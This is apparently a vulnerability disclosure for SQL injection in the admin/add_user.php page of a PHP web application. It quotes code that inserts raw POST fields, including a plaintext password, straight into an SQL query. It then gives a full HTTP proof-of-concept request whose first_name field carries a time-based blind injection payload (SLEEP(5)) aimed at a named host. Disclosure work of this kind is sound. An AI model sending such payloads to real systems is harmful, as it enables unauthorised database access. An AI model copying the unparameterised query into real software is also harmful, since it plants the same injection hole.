### Vulnerability file address

`admin/add_user.php` from line 7,The $first_name parameter is controllable, the parameter first_name can be passed through post, and the $first_name is not protected from sql injection, resulting in sql injection

```php
if(isset($_POST['btn_save']))
{
$first_name=$_POST['first_name'];
$last_name=$_POST['last_name'];
$email=$_POST['email'];
$user_password=$_POST['user_password'];
$mobile=$_POST['mobile'];
$address1=$_POST['address1'];
$address2=$_POST['address2'];

mysqli_query($con,"insert into user_info(first_name, last_name,email,password,mobile,address1,address2) values ('$first_name','$last_name','$email','$user_password','$mobile','$address1','$address2')") 
			or die ("Query 1 is inncorrect........");
header("location: manage_users.php"); 
mysqli_close($con);
```

### POC

```http
POST /admin/add_user.php HTTP/1.1
Host: www.onsp.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Origin: http://www.onsp.net
Connection: close
Referer: http://www.onsp.net/admin/add_user.php
Cookie: PHPSESSID=acrlvk4ljcqdujn2orbd09in25
Upgrade-Insecure-Requests: 1

first_name=1'+(SELECT 0x6e504162 WHERE 1952=1952 AND (SELECT 6458 FROM (SELECT(SLEEP(5)))rFne))+'&last_name=1&email=1&user_password=1&mobile=1&address1=1&address2=1&btn_save=
```

### Attack results pictures

![image-20220729215019850](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220729215019.png)